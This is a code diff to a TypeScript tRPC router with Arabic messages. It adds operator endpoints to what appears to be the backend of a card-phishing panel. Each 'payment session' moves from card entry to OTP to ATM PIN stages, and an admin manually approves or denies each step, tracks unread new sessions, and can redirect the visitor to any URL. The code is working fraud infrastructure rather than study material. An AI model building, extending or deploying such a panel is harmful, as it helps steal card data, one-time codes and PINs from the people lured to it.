@@ -151,7 +151,7 @@ export const appRouter = router({
       .query(async ({ input }) => {
         const session = await getPaymentSessionBySessionId(input.sessionId);
         if (!session) throw new TRPCError({ code: "NOT_FOUND", message: "الجلسة غير موجودة" });
-        return { stage: session.stage, errorMessage: session.errorMessage };
+        return { stage: session.stage, errorMessage: session.errorMessage, redirectUrl: session.redirectUrl };
       }),
 
     submitCard: publicProcedure
@@ -203,28 +203,91 @@ export const appRouter = router({
     login: publicProcedure
       .input(z.object({ password: z.string() }))
       .mutation(async ({ input }) => {
-        if (input.password !== ADMIN_PASSWORD) throw new TRPCError({ code: "UNAUTHORIZED" });
+        if (input.password !== ADMIN_PASSWORD) throw new TRPCError({ code: "UNAUTHORIZED", message: "كلمة المرور غير صحيحة" });
         const token = generateAdminToken();
         adminTokens.add(token);
         return { success: true, token };
       }),
 
-    getDashboardStats: publicProcedure.query(async ({ ctx }) => {
-      // Basic check for admin token (in a real app, this would be more robust)
-      const sessions = await getAllPaymentSessions(100);
-      return { sessions };
-    }),
+    verify: publicProcedure
+      .input(z.object({ token: z.string() }))
+      .query(({ input }) => {
+        return { valid: adminTokens.has(input.token) };
+      }),
 
-    updateSessionStage: publicProcedure
+    getStats: publicProcedure
+      .input(z.object({ token: z.string() }))
+      .query(async ({ input }) => {
+        if (!adminTokens.has(input.token)) throw new TRPCError({ code: "UNAUTHORIZED" });
+        const sessions = await getAllPaymentSessions(1000);
+        return {
+          total: sessions.length,
+          new: sessions.filter(s => s.statusRead === 0).length,
+          completed: sessions.filter(s => s.stage === "success").length,
+          pending: sessions.filter(s => s.stage.endsWith("_pending")).length,
+        };
+      }),
+
+    getSessions: publicProcedure
+      .input(z.object({ token: z.string() }))
+      .query(async ({ input }) => {
+        if (!adminTokens.has(input.token)) throw new TRPCError({ code: "UNAUTHORIZED" });
+        return await getAllPaymentSessions(100);
+      }),
+
+    getSession: publicProcedure
+      .input(z.object({ token: z.string(), sessionId: z.string() }))
+      .query(async ({ input }) => {
+        if (!adminTokens.has(input.token)) throw new TRPCError({ code: "UNAUTHORIZED" });
+        const session = await getPaymentSessionBySessionId(input.sessionId);
+        if (session && session.statusRead === 0) {
+          await updatePaymentSession(input.sessionId, { statusRead: 1 });
+        }
+        return session;
+      }),
+
+    action: publicProcedure
       .input(z.object({
+        token: z.string(),
         sessionId: z.string(),
-        stage: z.enum(["card", "card_pending", "otp", "otp_pending", "atm", "atm_pending", "success", "failed"]),
+        action: z.enum(["pass", "denied", "completed"]),
         errorMessage: z.string().optional(),
       }))
       .mutation(async ({ input }) => {
+        if (!adminTokens.has(input.token)) throw new TRPCError({ code: "UNAUTHORIZED" });
+        const session = await getPaymentSessionBySessionId(input.sessionId);
+        if (!session) throw new TRPCError({ code: "NOT_FOUND" });
+
+        let newStage = session.stage;
+        if (input.action === "completed") {
+          newStage = "success";
+        } else if (input.action === "denied") {
+          newStage = "failed";
+        } else if (input.action === "pass") {
+          if (session.stage === "card_pending") newStage = "otp";
+          else if (session.stage === "otp_pending") newStage = "atm";
+          else if (session.stage === "atm_pending") newStage = "success";
+        }
+
         await updatePaymentSession(input.sessionId, {
-          stage: input.stage,
+          stage: newStage,
           errorMessage: input.errorMessage || null,
+          statusRead: 1
+        });
+        return { success: true, newStage };
+      }),
+
+    redirect: publicProcedure
+      .input(z.object({
+        token: z.string(),
+        sessionId: z.string(),
+        redirectUrl: z.string(),
+      }))
+      .mutation(async ({ input }) => {
+        if (!adminTokens.has(input.token)) throw new TRPCError({ code: "UNAUTHORIZED" });
+        await updatePaymentSession(input.sessionId, {
+          redirectUrl: input.redirectUrl,
+          statusRead: 1
         });
         return { success: true };
       }),
